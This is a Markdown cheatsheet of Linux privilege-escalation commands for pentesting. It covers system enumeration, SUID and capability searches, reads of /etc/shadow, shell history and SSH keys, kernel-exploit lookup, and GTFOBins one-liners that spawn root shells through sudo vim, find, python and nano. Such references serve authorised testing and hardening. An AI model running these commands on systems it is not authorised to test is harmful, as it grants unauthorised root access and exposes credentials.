---
title: "Linux Privilege Escalation Cheatsheet"
description: "Complete guide of techniques and commands for privilege escalation on Linux systems. Includes enumeration, SUID exploitation, capabilities, kernel exploits and more."
category: "cheatsheets"
tags: ["linux", "privilege-escalation", "pentesting", "enumeration", "suid", "sudo"]
---

# Linux Privilege Escalation Cheatsheet

Quick reference guide for privilege escalation on Linux systems during pentesting.

## System Enumeration

```bash
# System information
uname -a
cat /etc/issue
cat /etc/*-release

# Kernel information
cat /proc/version
uname -r

# Environment variables
env
echo $PATH

# Users and groups
whoami
id
cat /etc/passwd
cat /etc/group
cat /etc/shadow  # If you have permissions
```

## SUID/SGID Search

```bash
# Files with SUID
find / -perm -4000 -type f 2>/dev/null

# Files with SGID
find / -perm -2000 -type f 2>/dev/null

# Files with capabilities
getcap -r / 2>/dev/null
```

## Sudo and Permissions

```bash
# Commands you can run as sudo
sudo -l

# Sudo history
cat /var/log/auth.log | grep sudo
```

## Exploitable Capabilities

```bash
# List capabilities
getcap -r / 2>/dev/null

# Common exploitable capabilities
# cap_setuid - Allows changing UID
# cap_dac_override - Bypass file permissions
# cap_sys_admin - Administrative permissions
```

## Cron Jobs

```bash
# System crontabs
cat /etc/crontab
ls -la /etc/cron.*

# User crontabs
crontab -l
ls -la /var/spool/cron/crontabs/
```

## Services and Processes

```bash
# Running services
ps aux
ps -ef
systemctl list-units --type=service

# Processes running as root
ps aux | grep root
```

## Sensitive Files and Directories

```bash
# Files with passwords
grep -r "password" /etc/ 2>/dev/null
grep -r "pass" /var/log/ 2>/dev/null

# Command history
cat ~/.bash_history
cat ~/.zsh_history

# SSH keys
find / -name id_rsa 2>/dev/null
find / -name authorized_keys 2>/dev/null
```

## Kernel Exploits

```bash
# Search for known exploits
searchsploit "Linux Kernel"
searchsploit "Linux Kernel 4.4"  # Specific version

# Compile exploit
gcc -o exploit exploit.c
```

## Automatic Enumeration Tools

```bash
# LinPEAS
./linpeas.sh

# LinEnum
./LinEnum.sh

# Linux Smart Enumeration
./lse.sh

# pspy - Process monitoring without root
./pspy64
```

## GTFOBins - Sudo/SUID Bypass

Check [GTFOBins](https://gtfobins.github.io/) for specific techniques for each binary.

Common examples:

```bash
# vim with sudo
sudo vim -c ':!/bin/bash'

# find with SUID
find . -exec /bin/bash -p \;

# python with sudo
sudo python -c 'import os; os.system("/bin/bash")'

# nano with sudo
sudo nano
^R^X
reset; bash 1>&0 2>&0
```

## Additional Resources

- [HackTricks - Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [GTFOBins](https://gtfobins.github.io/)
